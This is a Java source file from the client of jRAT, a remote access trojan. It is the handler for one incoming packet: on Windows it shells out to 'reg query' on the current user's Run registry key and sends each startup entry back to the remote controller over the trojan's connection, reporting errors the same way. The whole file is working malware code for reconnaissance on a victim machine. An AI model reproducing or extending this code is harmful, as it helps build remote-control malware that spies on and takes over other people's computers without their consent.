package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.packets.outgoing.Packet53RegistryStartup;
import oslib.OperatingSystem;

import java.io.BufferedReader;
import java.io.InputStreamReader;


public class Packet78RegistryStartup implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		try {
			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				Process p = Runtime.getRuntime().exec(new String[] { "reg", "query", "hkcu\\software\\microsoft\\windows\\currentversion\\run\\", "/s" });
				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

				String line;

				while ((line = reader.readLine()) != null) {
					String[] args = line.trim().split("    ");

					con.addToSendQueue(new Packet53RegistryStartup(args));
				}
				reader.close();
			} else {
				throw new Exception("Windows only");
			}
		} catch (Exception ex) {
			con.addToSendQueue(new Packet53RegistryStartup("Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
		}
	}

}
